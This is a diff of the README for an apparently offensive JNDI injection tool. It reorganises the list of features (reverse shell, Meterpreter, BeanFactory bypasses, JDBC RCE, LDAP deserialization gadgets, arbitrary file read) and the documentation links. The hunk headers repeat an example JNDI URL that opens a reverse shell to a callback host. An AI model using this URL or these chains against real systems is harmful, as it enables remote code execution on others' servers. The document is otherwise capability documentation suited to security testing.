@@ -34,17 +34,34 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 ## 🚩 Features
 
-- DNS Log
-- execute command
-- native reverse shell (Windows supported)
-- native Meterpreter
-- load custom class bytecode
-- Tomcat/Groovy/SnakeYaml/XStream/MVEL/BeanShell bypass
-- Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
-- NativeLibLoader (load native library)
-- MLet (detect classes in classpath)
-- LDAP(s) deserialization
-- custom JNDI payload (based on Nashorn JS Engine)
+- DNSLog
+- Command execution
+- Spawn reverse shell
+- Spawn Meterpreter 
+- Load custom Java bytecode
+- Customize payload based on Nashorn JS engine
+- BeanFactory Bypass
+    - Tomcat
+    - Groovy
+    - XStream
+    - SnakeYaml
+    - BeanShell
+    - MVEL
+    - MLet (detect Java class)
+    - NativeLibLoader (load native library)
+- JDBC RCE (MySQL, PostgreSQL, H2 and Derby)
+    - Commons DBCP
+    - Tomcat DBCP
+    - Tomcat JDBC
+    - Alibaba Druid
+    - HikariCP
+- LDAP Deserialization:
+    - CommonsCollections K1-K4
+    - CommonsBeanutils183
+    - CommonsBeanutils194
+    - Jackson
+    - Fastjson1
+    - Fastjson2
 
 ## 📖 Documentation
 
@@ -52,15 +69,26 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 - [Usage](USAGE.en.md#usage)
 - [Basic](USAGE.en.md#basic)
-- [Bypass](USAGE.en.md#bypass)
-- [MLet](USAGE.en.md#mlet)
-- [NativeLibLoader](USAGE.en.md#nativelibloader)
+- [Notes on JNDI URL](USAGE.en.md#notes-on-jndi-url)
+- [BeanFactory Bypass](USAGE.en.md#beanfactory-bypass)
+    - [Tomcat ELProcessor](USAGE.en.md#tomcat-elprocessor)
+    - [Groovy ClassLoader/Shell](USAGE.en.md#groovy-classloadershell)
+    - [XStream](USAGE.en.md#xstream)
+    - [SnakeYaml](USAGE.en.md#snakeyaml)
+    - [BeanShell](USAGE.en.md#beanshell)
+    - [MVEL](USAGE.en.md#mvel)
+    - [MLet](USAGE.en.md#mlet)
+    - [NativeLibLoader](USAGE.en.md#nativelibloader)
 - [JDBC RCE](USAGE.en.md#jdbc-rce)
-  - [MySQL](USAGE.en.md#mysql)
-  - [PostgreSQL](USAGE.en.md#postgresql)
-  - [H2](USAGE.en.md#h2)
-  - [Derby](USAGE.en.md#derby)
-- [Deserialize](USAGE.en.md#deserialize)
+    - [MySQL](USAGE.en.md#mysql)
+        - [MySQL JDBC Deserialization RCE](USAGE.en.md#mysql-jdbc-deserialization-rce)
+        - [MySQL Client Arbitrary File Read](USAGE.en.md#mysql-client-arbitrary-file-read)
+    - [PostgreSQL](USAGE.en.md#postgresql)
+    - [H2](USAGE.en.md#h2)
+    - [Derby](USAGE.en.md#derby)
+        - [Derby SQL RCE](USAGE.en.md#derby-sql-rce)
+        - [Derby Master-Slave Replication Deserialization RCE](USAGE.en.md#derby-master-slave-replication-deserialization-rce)
+- [LDAP Deserialization](USAGE.en.md#ldap-deserialization)
 - [Script](USAGE.en.md#script)
 - [useReferenceOnly](USAGE.en.md#usereferenceonly)
 
